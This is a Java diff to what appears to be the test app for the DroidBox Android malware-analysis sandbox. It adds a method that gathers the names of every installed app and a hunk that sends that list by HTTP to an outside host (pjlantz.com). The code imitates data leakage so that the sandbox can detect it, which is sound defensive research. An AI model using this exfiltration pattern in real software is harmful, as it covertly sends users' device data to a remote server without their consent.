@@ -31,16 +31,22 @@ import java.net.URL;
 import java.security.InvalidKeyException;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
+import java.util.List;
+
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.SecretKeySpec;
 import android.app.Activity;
+import android.content.ContentValues;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.provider.Browser;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -49,7 +55,7 @@ public class DroidBoxTests extends Activity {
 	
 	private String imei, hashedImei, contactName;
 	private String encryptedImei, phoneNbr, msg;
-	private String fileContent;
+	private String fileContent, installedApps;
 	
 	private static final byte[] KEY = { 0, 42, 2, 54, 4, 45, 6, 7, 65, 9, 54, 11, 12, 13, 60, 15 };
 	private static final byte[] KEY2 = { 0, 42, 2, 54, 4, 45, 6, 8 };
@@ -64,6 +70,8 @@ public class DroidBoxTests extends Activity {
         // Setup test variables
         this.setupTest();
         // Run tests
+        this.testAddBookmark();
+        this.testGetInstalledApps();
         this.testWriteFile();
         this.testReadFile();
         this.testContactRead();
@@ -87,6 +95,29 @@ public class DroidBoxTests extends Activity {
     }
     
     /**
+     * Add bookmark to a content provider
+     */
+    public void testAddBookmark() {
+    	Log.v("Test", "[*] testAddBookmark()");
+    	ContentValues bookmarkValues = new ContentValues();
+    	bookmarkValues.put(Browser.BookmarkColumns.BOOKMARK, 1);
+    	bookmarkValues.put(Browser.BookmarkColumns.TITLE, "Test");
+    	bookmarkValues.put(Browser.BookmarkColumns.URL, "http://www.pjlantz.com");
+    }
+    
+    /**
+     * Retrieve list with installed apps
+     */
+    public void testGetInstalledApps() {
+    	Log.v("Test", "[*] testGetInstalledApps()");
+    	PackageManager pm = getPackageManager();
+    	List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+    	installedApps = "";
+        for (ApplicationInfo packageInfo : packages)
+        	installedApps += packageInfo.packageName + ":";
+    }
+    
+    /**
      * Write a file to the device
      */
     public void testWriteFile() {
@@ -97,7 +128,7 @@ public class DroidBoxTests extends Activity {
     		out.close();
     		} catch (IOException e) {
     			e.printStackTrace();
-    		}
+    	}
     }
     
     /**
@@ -324,6 +355,13 @@ public class DroidBoxTests extends Activity {
             urlConnection = (HttpURLConnection) url.openConnection();
             rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
             while ((line = rd.readLine()) != null);
+            
+            // HttpURLConnection sending installed apps
+            url = new URL("http://pjlantz.com/app.php?installed=" + installedApps.replace(" ", "+"));
+            urlConnection = (HttpURLConnection) url.openConnection();
+            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
+            while ((line = rd.readLine()) != null);
+            
         } catch (IOException e) {
             e.printStackTrace();
         } finally {
